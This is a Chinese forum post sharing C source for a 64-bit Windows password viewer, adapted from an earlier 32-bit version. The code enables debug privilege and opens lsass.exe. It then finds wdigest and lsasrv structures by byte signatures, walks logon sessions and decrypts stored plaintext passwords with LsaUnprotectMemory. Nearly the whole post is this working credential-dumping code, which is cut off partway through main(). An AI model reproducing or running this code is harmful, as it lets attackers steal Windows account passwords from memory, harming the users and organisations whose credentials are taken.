
# [分享][分享]64位密码查看 简短代码版

分享下 无需注入 根据 Vsbat 的32位代码改的 http://bbs.pediy.com/showthread.php?t=156643 改了几处 32位与64位的 `DecryptKeySign` 特征码不同 求法也不同 用IDA可定位查看

```
#include <windows.h>

#include <stdio.h>

#include <tlhelp32.h>

#include <psapi.h>

//
//  Vsbat[0x710dddd]
//
//  Note: VC++ 6.0编译/Admin权限执行
//

#define MEM_SIZE 0x1000
#define WIN8     0x0
#define WIN7     0x1
#define WINXP    0x2
#define WIN03    0x4
#define RtlEqualLuid(L1, L2) (((L1)->LowPart == (L2)->LowPart) && ((L1)->HighPart == (L2)->HighPart))

typedef struct _LSA_UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} LSA_UNICODE_STRING , *PLSA_UNICODE_STRING ;

typedef struct _KIWI_GENERIC_PRIMARY_CREDENTIAL
{
        LSA_UNICODE_STRING UserName;
        LSA_UNICODE_STRING Domaine;
        LSA_UNICODE_STRING Password;
} KIWI_GENERIC_PRIMARY_CREDENTIAL, * PKIWI_GENERIC_PRIMARY_CREDENTIAL;

typedef struct _SECURITY_LOGON_SESSION_DATA {
    ULONG Size;
    LUID LogonId;
    LSA_UNICODE_STRING UserName;
    LSA_UNICODE_STRING LogonDomain;
    LSA_UNICODE_STRING AuthenticationPackage;
    ULONG LogonType;  ULONG Session;
    PSID Sid;
    LARGE_INTEGER LogonTime;
    LSA_UNICODE_STRING LogonServer;
    LSA_UNICODE_STRING DnsDomainName;
    LSA_UNICODE_STRING Upn;
} SECURITY_LOGON_SESSION_DATA,  *PSECURITY_LOGON_SESSION_DATA ;

typedef int (__stdcall * pNTQUERYPROCESSINFORMATION)(HANDLE, DWORD, PVOID, ULONG, PULONG) ;
typedef int (__stdcall * pLSAENUMERATELOGONSESSIONS)(PULONG, PLUID *) ;
typedef int (__stdcall * pDECRIPTFUNC)(PBYTE, DWORD) ;
typedef int (__stdcall * pLSAFREERETURNBUFFER)(PVOID) ;
typedef int (__stdcall * pLSAGETLOGONSESSIONDATA)(PLUID, PSECURITY_LOGON_SESSION_DATA *) ;

typedef struct _LSA_SECPKG_FUNCTION_TABLE {
        long long Func[44];
    long long LsaProtectMemory;
    pDECRIPTFUNC LsaUnprotectMemory;
} LSA_SECPKG_FUNCTION_TABLE, *PLSA_SECPKG_FUNCTION_TABLE;

PLSA_SECPKG_FUNCTION_TABLE  DecryptFunc ;
DWORD offsetWDigestPrimary = 0;
HANDLE    hProcess ;
char      *Data = NULL;
LPVOID    OripdataAddr;
SIZE_T    g_Size;

int    EnableDebugPrivilege() ;
void   printHexBytes(PBYTE data, int nBytes) ;
PBYTE  search_bytes(PBYTE pBegin, PBYTE pEnd, PBYTE pBytes, DWORD nsize) ;
void   CopyKeyGlobalData(HANDLE hProcess, LPVOID hModlsasrv, int osKind) ;
HANDLE GetProcessHandleByName(const CHAR *szName) ;
LPVOID GetEncryptListHead() ;
void   printSessionInfo(pLSAGETLOGONSESSIONDATA, pLSAFREERETURNBUFFER, PLUID) ;

BYTE DecryptKeySign_WIN7[]  = { 0xF6, 0xC2, 0x07, 0x0F, 0x85, 0x0D, 0x1A, 0x02, 0x00 } ;
BYTE DecryptKeySign_WIN8_7601[]  = { 0xF6, 0xC2, 0x07, 0x0F, 0x85, 0x72, 0xEA, 0x01, 0x00 } ;
BYTE DecryptKeySign_XP[]    = { 0x4C, 0x8B, 0xCB, 0x48, 0x89, 0x44, 0x24, 0x30} ;
BYTE KeyPointerSign[]  = { 0x4c, 0x89, 0x1b, 0x48, 0x89, 0x43, 0x08, 0x49, 0x89, 0x5b, 0x08, 0x48, 0x8d } ;
BYTE MemBuf[MEM_SIZE], SecBuf[0x200], ThirdBuf[0x200] ;
BYTE Encryptdata[0x100] ;

HANDLE GetProcessList()
{
        BOOL bRet;
        HANDLE hProcess = NULL;
        PROCESSENTRY32 pInfo;
        pInfo.dwSize = sizeof(PROCESSENTRY32);
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if(hSnapshot == INVALID_HANDLE_VALUE)
        {
                printf("ProcessList Error...\n");
                return hProcess;
        }
        for(bRet = Process32First(hSnapshot, &pInfo); bRet; bRet = Process32Next(hSnapshot, &pInfo))
        {
          if(lstrcmpi(pInfo.szExeFile, "lsass.exe") == 0)
                  {
                          hProcess = OpenProcess(PROCESS_ALL_ACCESS , FALSE, pInfo.th32ProcessID);
                          break;
                  }
        }
        return hProcess;
}

LPVOID GetEncryptListHead()
{
    HINSTANCE hMod ;
    LPVOID    pEndAddr, pTemp ;
    PBYTE *KeyPointer;
    hMod = LoadLibrary("wdigest.dll") ;
    pEndAddr = GetProcAddress(hMod, "SpInstanceInit") ;
    pTemp = hMod ;
    KeyPointer = NULL ;
    if(pTemp < pEndAddr && pTemp != NULL)
    {
                KeyPointer = (PBYTE *)&pTemp ;
        pTemp = (LPVOID)search_bytes((PBYTE)pTemp + sizeof(KeyPointerSign), (PBYTE)pEndAddr, \
                KeyPointerSign, sizeof(KeyPointerSign)) ;
        }
        *KeyPointer += -4;
        *KeyPointer += sizeof(long) + *reinterpret_cast<long *>(*KeyPointer);
    FreeLibrary(hMod) ;
    return *KeyPointer ;
}

LPVOID searchLSAFuncs()
{
        HMODULE hLsasrv;
        if(hLsasrv = LoadLibraryW(L"lsasrv"))
        {
                MODULEINFO mesInfos;
                if(GetModuleInformation(GetCurrentProcess(), hLsasrv, &mesInfos, sizeof(MODULEINFO)))
                {
                        struct {PVOID LsaIRegisterNotification; PVOID LsaICancelNotification;} extractPkgFunctionTable = {GetProcAddress(hLsasrv, "LsaIRegisterNotification"), GetProcAddress(hLsasrv, "LsaICancelNotification")};
                        if(extractPkgFunctionTable.LsaIRegisterNotification && extractPkgFunctionTable.LsaICancelNotification)
                                return search_bytes((PBYTE)hLsasrv, (PBYTE)(hLsasrv + mesInfos.SizeOfImage), reinterpret_cast<PBYTE>(&extractPkgFunctionTable), sizeof(extractPkgFunctionTable));
                }
        }
        return NULL;
}

void getPtrFromLinkedListByLuid(PLIST_ENTRY pSecurityStruct, unsigned long LUIDoffset, PLUID luidToFind)
{
        SIZE_T dwBytesRead;
        PLIST_ENTRY resultat = NULL;
        char EncryptBuf[0x100] = {0};
        ReadProcessMemory(hProcess,  pSecurityStruct, EncryptBuf, 0x100, &dwBytesRead) ;
        while(((PLIST_ENTRY)EncryptBuf)->Flink != pSecurityStruct)
        {
                ReadProcessMemory(hProcess, ((PLIST_ENTRY)EncryptBuf)->Flink, EncryptBuf, 0x100, &dwBytesRead) ;
        if(RtlEqualLuid(luidToFind, reinterpret_cast<PLUID>(reinterpret_cast<PBYTE>(EncryptBuf) + LUIDoffset)))
                {
                        break;
                }
        }
        if(((PLIST_ENTRY)EncryptBuf)->Flink == pSecurityStruct)
        {
                puts("Specific LUID NOT found\n") ;
                return ;
        }
        PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCreds = NULL;
        mesCreds = reinterpret_cast<PKIWI_GENERIC_PRIMARY_CREDENTIAL>(reinterpret_cast<PBYTE>(EncryptBuf) + offsetWDigestPrimary);
        if(mesCreds)
        {
                BYTE Password[100] = {0};
                ReadProcessMemory(hProcess, mesCreds->Password.Buffer, Password, mesCreds->Password.MaximumLength, &dwBytesRead);
                DecryptFunc->LsaUnprotectMemory(Password, mesCreds->Password.MaximumLength);
                printf("PassWord: %S\n\n", Password);
        }
}

int main()
{
    HINSTANCE hModlsasrv ;
    DWORD     LogonSessionCount, i ;
    PLUID     LogonSessionList, pCurLUID ;
    if(EnableDebugPrivilege() != 1)
        puts("EnableDebugPrivilege fail !") ;
    hProcess = GetProcessList() ;
    if(hProcess == NULL)
    {
        puts("GetProcessHandleByName fail !") ;
        puts("Try To Run As Administrator ...") ;
        system("echo Press any Key to Continue ... & pause > nul") ;
        return 0 ;
    }
    OSVERSIONINFO VersionInformation ;
    DWORD osKind = -1 ;
    memset(&VersionInformation, 0, sizeof(VersionInformation));
    VersionInformation.dwOSVersionInfoSize = sizeof(VersionInformation) ;
    GetVersionEx(&VersionInformation) ;
    if (VersionInformation.dwMajorVersion == 5)
    {
      if ( VersionInformation.dwMinorVersion == 1 )
      {
            osKind = WINXP ;
      }
      else if (VersionInformation.dwMinorVersion == 2)
      {
            osKind = WIN03 ;
      }
    }
    else if (VersionInformation.dwMajorVersion == 6)
        {
                if(VersionInformation.dwBuildNumber == 7601)
                        osKind = WIN8;
```
